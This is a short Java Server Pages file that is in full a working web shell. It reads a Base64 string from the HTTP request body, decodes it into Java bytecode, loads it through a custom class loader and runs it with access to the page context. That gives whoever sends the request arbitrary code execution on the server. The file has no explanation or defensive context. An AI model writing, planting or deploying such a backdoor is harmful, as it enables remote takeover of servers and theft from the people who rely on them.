<%@ page import="java.io.BufferedReader" %>
<%@ page import="java.util.Base64" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%!
    class U extends ClassLoader{
        U(ClassLoader c){
            super(c);
        }

        public Class g(byte []b){
            return super.defineClass(b,0,b.length);
        }
    }
%>
<%
    String wholeStr = request.getReader().readLine();
    if(wholeStr != null && !wholeStr.trim().equals("")) {
        new U(this.getClass().getClassLoader()).g(Base64.getDecoder().decode(wholeStr)).newInstance().equals(pageContext);
    }
%>